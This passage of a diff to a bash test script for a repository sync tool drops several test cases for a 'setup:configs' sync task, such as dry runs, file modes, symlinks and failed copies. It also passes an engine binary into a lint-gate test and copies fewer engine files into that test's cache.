-check_configs_log "$name" -h "Updated the local sync task to $task_short"
-check_that "$name: the file of the clone" is_clone_sync "$task_sync"
-
-name="setup:configs with equal files"
-new_task_case task-equal
-settle_task
-got=0
-run_task || got=$?
-check_configs "$name" 0 "$got" "$task_commit"
-check_configs_log "$name" -h 'The local sync task is up to date'
-check_configs_log "$name" -l 'Updated the local sync task'
-check_lines_order "$name" 'Updating the clone' 'The local sync task is up to date'
-
-name="setup:configs, a dry run with equal files"
-new_task_case task-dry-equal
-settle_task
-got=0
-usage_dry_run=true run_task || got=$?
-check_configs "$name" 0 "$got" "$task_commit"
-check_configs_log "$name" -h 'The local sync task is up to date'
-check_configs_log "$name" -l 'Would update the local sync task'
-
-name="setup:configs, a dry run copies nothing"
-new_task_case task-dry-stale
-stale_sync "$task_sync"
-got=0
-usage_dry_run=true run_task || got=$?
-check_configs "$name" 0 "$got" "$task_commit"
-check_configs_log "$name" -h "Would update the local sync task to $task_short"
-check_configs_log "$name" -l 'Updated the local sync task'
-check_that "$name: the local file stays" is_stale_sync "$task_sync"
-
-name="setup:configs, a difference in the mode"
-new_task_case task-mode
-settle_task
-task_mode=$(stat -c %a -- "$task_helpers" 2> /dev/null || stat -f %Lp -- "$task_helpers")
-chmod 600 "$task_helpers"
-got=0
-run_task || got=$?
-check_configs "$name" 0 "$got" "$task_commit"
-check_configs_log "$name" -h "Updated the local sync task to $task_short"
-check_that "$name: the mode of the clone" mode_is "$task_mode" "$task_helpers"
-
-name="setup:configs, a local symlink stays"
-new_task_case task-symlink
-settle_task
-task_link_target="${cache%/*}/link-target"
-printf '%s\n' '# my own task' > "$task_link_target"
-rm -f -- "$task_sync"
-ln -s -- "$task_link_target" "$task_sync"
-got=0
-run_task || got=$?
-check_configs "$name" 0 "$got" "$task_commit"
-check_configs_log "$name" -h 'The local sync task is up to date'
-check_that "$name: the link" test -L "$task_sync"
-check_that "$name: its target" grep -qxF '# my own task' "$task_link_target"
-
-name="setup:configs, a copy that fails continues"
-new_task_case task-copy-fails
-settle_task
-stale_sync "$task_sync"
-chmod 555 "${task_sync%/*}"
-got=0
-run_task || got=$?
-chmod 755 "${task_sync%/*}"
-check_configs "$name" 0 "$got" "$task_commit"
-check_configs_log "$name" -h "Cannot update $task_sync - using the local file"
-check_configs_log "$name" -l 'Updated the local sync task'
-check_configs_log "$name" -l 'The local sync task is up to date'
-check_that "$name: the local file stays" is_stale_sync "$task_sync"
-
-name="setup:configs --sub replaces the sync task of the member"
-new_task_case task-sub
-mkdir -p -- "$task_root/sub/${sync_path%/*}"
-stale_sync "$task_sync"
-stale_sync "$task_root/sub/$sync_path"
-got=0
-usage_sub=true run_task || got=$?
-check_configs "$name" 0 "$got" "$task_commit"
-check_synced "$name" "$task_commit"$'\n'"$task_commit sub"
-check_that "$name: the file of the root" is_clone_sync "$task_sync"
-check_that "$name: the file of the member" is_clone_sync "$task_root/sub/$sync_path"
-
 # The gate code:lint:repo-sync. It finds gomplate with `mise x`, so it starts in
 # this repository, and then it does a cd to its own MISE_PROJECT_ROOT.
 lint_task="$root/repo/tools/repo-sync/.config/mise/tasks/code/lint/repo-sync"
@@ -3598,11 +3406,12 @@ cp -- "$root/.config/mise/tasks/_scripts/helpers" "$gate_root/.config/mise/tasks
 printf '%s\n' 'repo_name = "test"' 'repo_url = "https://example.com/test"' 'environments = [ "dev" ]' \
   > "$gate_root/.config/bootstrap.toml"
 
+# SYNC_ENGINE_BIN gives the engine to the shim of the cache.
 run_gate() {
   (
     cd -- "$root"
     env -u usage_files -u REPO_SYNC_VALUES MISE_PROJECT_ROOT="$gate_root" SYNC_ENGINE_CACHE="$gate_cache" \
-      bash "$lint_task"
+      SYNC_ENGINE_BIN="$bin" bash "$lint_task"
   ) > "$log" 2>&1
 }
 
@@ -3617,8 +3426,7 @@ else
 fi
 
 mkdir -p -- "$gate_cache/repo/sync-engine"
-cp -- "$root/sync-engine/repo-sync" "$root/sync-engine/common" "$root/sync-engine/write" "$root/sync-engine/merge" \
-  "$root/sync-engine/select" "$root/sync-engine/manifest" "$root/sync-engine/values" "$root/sync-engine/mise" "$gate_cache/repo/sync-engine/"
+cp -- "$root/sync-engine/repo-sync" "$root/sync-engine/VERSION" "$gate_cache/repo/sync-engine/"
 _git init --quiet "$gate_cache/repo"
 _git -C "$gate_cache/repo" remote add origin https://github.com/virajp/bootstrap.git
 got=0
